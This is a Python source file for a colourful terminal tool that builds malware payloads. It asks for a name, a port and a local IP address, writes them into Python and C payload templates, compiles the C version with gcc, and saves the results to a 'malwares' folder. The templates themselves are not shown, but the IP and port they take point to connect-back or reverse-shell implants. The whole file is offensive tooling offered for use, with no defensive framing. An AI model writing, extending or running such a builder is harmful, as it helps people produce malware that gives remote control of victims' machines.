import subprocess
import platform
from colorama import Fore,Back,Style
import time
import os

reset = Style.RESET_ALL

from module import banner

def Select_Payload():

    banner.clear()
    banner.banner()
    banner.builer_menu()

    try:

        select_payload =  input(Fore.RED+" ┌─["+Fore.LIGHTGREEN_EX+"MY-TOOLS"+Fore.BLUE+"~"+Fore.WHITE+"@HOME"+Fore.YELLOW+"/"+Fore.BLUE+"Select Payload"+Fore.RED+"""]
 └──╼ """+Fore.WHITE+"$ ")


        if select_payload == "1":
            banner.clear()
            banner.banner()
            banner.platform_menu()

            select_platform = input(Fore.RED+" ┌─["+Fore.LIGHTGREEN_EX+"MY-TOOLS"+Fore.BLUE+"~"+Fore.WHITE+"@HOME"+Fore.YELLOW+"/"+Fore.CYAN+"Select Platform"+Fore.RED+"""]
 └──╼ """+Fore.WHITE+"$ ")
            
            if select_platform == "1":
                Build_payload()

            elif select_platform == "2":
                input(Fore.LIGHTRED_EX+" [*]  Back To Menu (Press Enter...) ")

        elif select_payload == "2":



                #############



            banner.clear()
            banner.banner()

            print(Back.BLUE+" Please Enter Payload Name > malware\n"+reset)
            print('  ')
            get_payload_name = input(Fore.RED+" ┌─["+Fore.LIGHTGREEN_EX+"MY-TOOLS"+Fore.BLUE+"~"+Fore.WHITE+"@HOME"+Fore.YELLOW+"/"+Fore.CYAN+"SP"+Fore.WHITE+"/"+Fore.GREEN+"Get Payload Name"+Fore.RED+"""]
 └──╼ """+  Fore.WHITE+"$ ")

            Payload_name = get_payload_name


            banner.clear()
            banner.banner()
            print(Back.CYAN+"\n Ok. Please Enter Port (: > Just Enter Number"+reset)
            print('  ')
            get_port_addr = input(Fore.RED+" ┌─["+Fore.LIGHTGREEN_EX+"MY-TOOLS"+Fore.BLUE+"~"+Fore.WHITE+"@HOME"+Fore.YELLOW+"/"+Fore.CYAN+"SP"+Fore.WHITE+"/"+Fore.GREEN+"Get Port Addr"+Fore.RED+"""]
 └──╼ """+Fore.WHITE+"$ ")
            banner.clear()
            banner.banner()
            print(Back.GREEN+"\n Thanks (: Please Enter Local IP Addr"+reset)
            print('  ')
            get_ip_addr = input(Fore.RED+" ┌─["+Fore.LIGHTGREEN_EX+"MY-TOOLS"+Fore.BLUE+"~"+Fore.WHITE+"@HOME"+Fore.YELLOW+"/"+Fore.CYAN+"SP"+Fore.WHITE+"/"+Fore.GREEN+"Get IP Addr"+Fore.RED+"""]
 └──╼ """+Fore.WHITE+"$ ")
            payload_data = open("payloads/s-payload.py","r").read().replace("myport",get_port_addr).replace("myip",get_ip_addr)


            new_file = open(f"malwares/{get_payload_name}.py","w")
            new_file.write(payload_data)
            new_file.close()

            banner.clear()
            banner.banner()

            time.sleep(4)


            ####################


            print(Back.GREEN+"\n  Your Payload Generated . . .  "+reset)
            print(Back.RED+"\n  Please Check Folder . . .  "+reset)
            print('  ')
            input(Fore.LIGHTRED_EX+" [*]  Back To Menu (Press Enter...) ")
        
        

        
        elif select_payload == "3":
            input(Fore.LIGHTRED_EX+" [*]  Back To Menu (Press Enter...) ")
    except:
        exit("\n\n error")
        



#########################




def Build_payload():
    banner.clear()
    banner.banner()

    print(Back.BLUE+" Please Enter Payload Name > malware\n"+reset)
    print('  ')
    try:

        get_payload_name = input(Fore.RED+" ┌─["+Fore.LIGHTGREEN_EX+"MY-TOOLS"+Fore.BLUE+"~"+Fore.WHITE+"@HOME"+Fore.YELLOW+"/"+Fore.CYAN+"SP"+Fore.WHITE+"/"+Fore.GREEN+"Get Payload Name"+Fore.RED+"""]
 └──╼ """+Fore.WHITE+"$ ")

        Payload_name = get_payload_name


        banner.clear()
        banner.banner()
        print(Back.CYAN+"\n Ok. Please Enter Port (: > Just Enter Number"+reset)
        print('  ')
        get_port_addr = input(Fore.RED+" ┌─["+Fore.LIGHTGREEN_EX+"MY-TOOLS"+Fore.BLUE+"~"+Fore.WHITE+"@HOME"+Fore.YELLOW+"/"+Fore.CYAN+"SP"+Fore.WHITE+"/"+Fore.GREEN+"Get Port Addr"+Fore.RED+"""]
 └──╼ """+Fore.WHITE+"$ ")



        banner.clear()
        banner.banner()
        print(Back.GREEN+"\n Thanks (: Please Enter Local IP Addr"+reset)
        print('  ')
        get_ip_addr = input(Fore.RED+" ┌─["+Fore.LIGHTGREEN_EX+"MY-TOOLS"+Fore.BLUE+"~"+Fore.WHITE+"@HOME"+Fore.YELLOW+"/"+Fore.CYAN+"SP"+Fore.WHITE+"/"+Fore.GREEN+"Get IP Addr"+Fore.RED+"""]
 └──╼ """+Fore.WHITE+"$ ")


        payload_data = open("payloads/c-lin.c","r").read().replace("MYPORT",get_port_addr).replace("MYIP",get_ip_addr)
        
        new_file = open("payloads/generate.c","w")
        new_file.write(payload_data)
        new_file.close()

        banner.clear()
        banner.banner()
        with open("log/bulder.log","w") as log:
            subprocess.Popen(("gcc","payloads/generate.c","-o",f"malwares/{Payload_name}"))
        
        time.sleep(4)
        os.remove("payloads/generate.c")
        print(Back.GREEN+"\n  Your Payload Generated . . .  "+reset)
        print(Back.RED+"\n  Please Check 'malwares' Folder . . .  "+reset)
        print('  ')


        input(Fore.LIGHTRED_EX+" [*]  Back To Menu (Press Enter...) ")
    
    except Exception as ex:
        print(ex)
        input(Fore.LIGHTRED_EX+" [*]  Back To Menu (Press Enter...) ")